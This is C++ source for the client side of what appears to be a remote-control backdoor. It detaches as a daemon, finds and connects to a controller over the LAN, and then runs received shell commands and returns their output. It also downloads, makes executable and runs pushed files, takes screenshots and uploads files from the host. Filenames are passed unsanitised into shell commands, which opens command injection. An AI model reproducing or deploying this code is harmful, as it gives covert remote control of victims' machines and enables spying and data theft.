#include <iostream>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include "be_controlled.h"

using namespace std;

void sig_term(int sig)
{
}

int be_con::s_photo_num = 1;

void be_con::search_control()
{
    int broadfd = 0;
    //一定要int，网上说的bool都不对
    int optval = 1;
    struct sockaddr_in broadaddr, seraddr, cliaddr;
    char buf[255] = {0};
    socklen_t len = sizeof(sockaddr);
    int clifd = 0;

    broadfd = socket(PF_INET, SOCK_DGRAM, 0);
    //设置一个接收的sockfd
    clifd = socket(AF_INET, SOCK_DGRAM, 0);
    cliaddr.sin_family = AF_INET;
    cliaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    cliaddr.sin_port = htons(g_cliudp_port);
    if(0 > bind(clifd, (sockaddr *)&cliaddr, len)){
        perror("");
        exit(1);
    }

    //设置为广播
    setsockopt(broadfd, SOL_SOCKET, SO_BROADCAST, &optval, sizeof(int));
    memset(&broadaddr, 0, sizeof(broadaddr));
    broadaddr.sin_family = AF_INET;
    broadaddr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
    broadaddr.sin_port = htons(g_broad_port);

    //给局域网内所有的端口为指定端口的机子发送数据
    sprintf(buf, "%s", get_local_ip(clifd));
    sendto(broadfd, buf, strlen(buf), 0, (sockaddr *)&broadaddr, len);
    memset(buf, 0, strlen(buf));

    //获取控制端的ip地址
    recvfrom(clifd, buf, 255, 0, (sockaddr *)&seraddr, &len);
    m_addr = inet_ntoa(seraddr.sin_addr);
    close(broadfd);
    close(clifd);
}

//链接控制端
bool be_con::conn()
{
    struct sockaddr_in seraddr;
    socklen_t addrlen = sizeof(seraddr);

    m_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(m_sockfd <= -1){
        perror("");
        exit(1);
    }
    seraddr.sin_family = AF_INET;
    seraddr.sin_port = htons(m_port);
    inet_aton(m_addr, &seraddr.sin_addr);
    if(0 > connect(m_sockfd, (const struct sockaddr *)&seraddr, addrlen)){
        perror("");
        exit(1);
    }
}

void be_con::deal_data()
{
    sock_data *d;
    size_t len = 0;
    char path[255] = {0};

    //接收消息
    d = (sock_data *)malloc(sizeof(sock_data)+g_max_send_sz);
    memset(d, 0, sizeof(sock_data)+g_max_send_sz);
    recv(m_sockfd, d, 1460, 0);
    switch(d->state)
    {
        case TAKE_P:
            take_photo();
            break;
        case EXE_C:
            exe_comm((const char *)d->buf, d->len);
            break;
        case EXE_F:
            //写文件，写完执行
            if(false == write_file(d, d->filename, len))
                break;
            exe_file((const char *)d->filename, d->len);
            break;
        case UPLOAD_F:
            cout << d->buf << endl;
            upload_file(get_fd(), (const char *)d->buf, d->len, UPLOAD_F);
            break;
        default:
            break;
    }
}

void be_con::take_photo()
{
    char str[255] = {0};
    char photo_name[255] = {0};

    sprintf(photo_name, "%d%s", s_photo_num, ".jpg");
    ++s_photo_num;
    sprintf(str, "%s%s%s", "import -window root ", "/tmp/", photo_name);
    if(0 > system(str)){
        perror("");
    }else{
        memset(str, 0, strlen(str));
        sprintf(str, "%s%s", "/tmp/", photo_name);
        //需要查看路径
        upload_file(get_fd(), str, strlen((const char *)str), TAKE_P);
    }
}

bool be_con::write_file(sock_data *d, const char *path, int len)
{
    int file_fd = 0;
    char basename[255] = {0};
    char name[255] = {0};
    FILE *fp = NULL;
    char cmd[255] = {0};

    //读取出文件名，并且在tmp目录下创建一个相同名字的文件
    sprintf(cmd, "%s%s", "basename ", path);
    fp = popen(cmd, "r");
    fread(basename, 1, 255, fp);
    for(int i = 0; i < 255; ++i){
        if(basename[i] == '\0'){
            basename[i-1] = '\0';
            break;
        }
    }
    sprintf(name, "%s%s", "/tmp/", basename);
    file_fd = open(name, O_CREAT | O_RDWR, 0644);
    //每次写入都要移动到文件尾部添加
    lseek(file_fd, 0, SEEK_END);
    write(file_fd, d->buf, d->len);
    close(file_fd);
    if(d->len < g_max_send_sz)
        return true;
    else
        return false;
}

void be_con::exe_file(const char *path, int len)
{
    char cmd[255] = {0};
    char basename[255] = {0};
    char name[255] = {0};
    FILE *fp = NULL;
    sock_data *d;

    sprintf(cmd, "%s%s", "basename ", path);
    fp = popen(cmd, "r");
    fread(basename, 1, 255, fp);
    for(int i = 0; i < 255; ++i){
        if(basename[i] == '\0'){
            basename[i-1] = '\0';
            break;
        }
    }
    sprintf(name, "%s%s", "/tmp/", basename);
    //增加可执行权限，之后直接执行
    sprintf(cmd, "%s %s", "chmod a+x", name);
    system(cmd);
    memset(cmd, 0, strlen(cmd));
    sprintf(cmd, "%s", name);
    d = (sock_data *)malloc(sizeof(sock_data));
    if(0 > system(cmd)){
        perror("");
        d->state = EXE_FAILED;
    }else{
        d->state = EXE_F;
    }
    //执行完毕，根据情况发送给对端
    send(m_sockfd, d, sizeof(sock_data), 0);
    free(d);
}

void be_con::exe_comm(const char *comm, int len)
{
    FILE *fp = NULL;
    sock_data *d;
    socklen_t data_len;
    int sz = 0;
    int left_sz = 0;

    //读入命令行产生的结果，并且切分后发送给对端
    fp = popen(comm, "r");
    d = (struct sock_data *)malloc(sizeof(sock_data) + g_max_send_sz);
    while(1){
        memset(d, 0, sizeof(*d)+g_max_send_sz);
        //1表示每块的大小， g_max_send_sz表示块的个数，返回值是返回块的个数
        sz = fread(d->buf, 1, g_max_send_sz, fp);
        d->len = sz;
        d->state = EXE_C;
        data_len = sizeof(*d) + d->len;
        send(m_sockfd, d, data_len, 0);
        if(sz < g_max_send_sz){
            break;
        }
    }
    free(d);
    fclose(fp);
}

int be_con::get_fd()
{
    return m_sockfd;
}

be_con::~be_con()
{
    system("rm -f /tmp/*.jpg");
    close(m_sockfd);
}

void create_daemon(be_con b_c, Func f)
{
    int pid = 0;
    int fd_max = 0;

    pid = fork();
    if(pid < 0){
        perror("");
        exit(1);
    }else if(pid == 0){
        //设置为会话组长
        setsid();
        //子进程的子进程为守护进程，防止控制终端
        if(0 > (pid = fork())){
            exit(1);
        }else if(pid == 0){
            fd_max = getdtablesize();
            //设置当前工作目录为根
            chdir("/");
            //重设掩码
            umask(0);
            //关闭所有的描述符
            for(int i = 0; i < fd_max; ++i){
                close(i);
            }
            signal(SIGTERM, sig_term);
            f(b_c);
        }else{
            exit(0);
        }
    }else{
        exit(0);
    }
}

void exe_cli(be_con b_c)
{
    b_c.search_control();
    b_c.conn();
    while(1){
        b_c.deal_data();
    }
}


